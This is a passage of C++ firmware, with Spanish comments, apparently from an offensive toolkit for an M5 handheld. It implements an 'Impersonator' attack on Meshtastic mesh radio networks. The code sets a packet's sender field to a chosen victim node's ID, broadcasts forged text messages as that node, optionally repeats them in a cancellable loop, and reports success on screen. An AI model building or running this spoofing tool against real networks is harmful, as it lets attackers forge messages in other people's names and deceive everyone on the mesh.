            M5.Display.setTextDatum(MC_DATUM);
            M5.Display.setTextColor(COL_WARNING);
            char prog_buf[32];
            snprintf(prog_buf, sizeof(prog_buf), "Enviando %lu / %lu", i + 1, count);
            M5.Display.drawString(prog_buf, LCD_WIDTH/2, LCD_HEIGHT/2 - 14);
            M5.Display.setFont(&fonts::Font0);
            M5.Display.setTextColor(COL_TEXT_DIM);
            M5.Display.drawString("` = detener", LCD_WIDTH/2, LCD_HEIGHT/2 + 10);

            // Esperar 500ms entre mensajes, permitiendo cancelar
            uint32_t wait_start = millis();
            while (millis() - wait_start < 500) {
                KeyEvent ev2 = keyboard_read();
                if (ev2.type == Key::Escape) { cancelled = true; break; }
                delay(10);
            }
            if (cancelled) break;
        }
    } else {
        MeshTxPacket pkt = mesh_build_packet(
            t.node_id,              // from = nodo victima (spoofing)
            MESH_BROADCAST_ADDR,   // to = broadcast
            PORTNUM_TEXT_MESSAGE,
            payload, payload_len,
            MESH_DEFAULT_HOP_LIMIT, ch);

        if (pkt.valid) {
            radio_transmit(pkt.data, pkt.len);
            Serial.printf("[Impersonator] Mensaje enviado como: %s (0x%08X)\n",
                t.long_name, t.node_id);
        } else {
            cancelled = true;
        }
    }

    // 5. Pantalla de resultado
    M5.Display.fillScreen(COL_BG);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    M5.Display.setTextDatum(MC_DATUM);

    if (cancelled && count == 1) {
        M5.Display.setTextColor(COL_DANGER);
        M5.Display.drawString("Error al construir paquete", LCD_WIDTH/2, 50);
    } else if (cancelled) {
        M5.Display.setTextColor(COL_WARNING);
        M5.Display.drawString("Envio interrumpido", LCD_WIDTH/2, 50);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.drawString("Verificar en app Meshtastic", LCD_WIDTH/2, 68);
    } else {
        M5.Display.setTextColor(COL_OK);
        M5.Display.drawString("Mensajes enviados!", LCD_WIDTH/2, 45);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.drawString("Verificar en app Meshtastic", LCD_WIDTH/2, 65);
        char id_buf[24];
        snprintf(id_buf, sizeof(id_buf), "from: !%08x", t.node_id);
        M5.Display.drawString(id_buf, LCD_WIDTH/2, 80);
    }

    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.setTextDatum(MC_DATUM);
    int fy2 = LCD_HEIGHT - UI_FOOTER_H;
    M5.Display.fillRect(0, fy2, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
    M5.Display.drawString("Presiona cualquier tecla...", LCD_WIDTH/2, fy2 + UI_FOOTER_H/2);

    keyboard_wait();
    radio_start_receive();
}
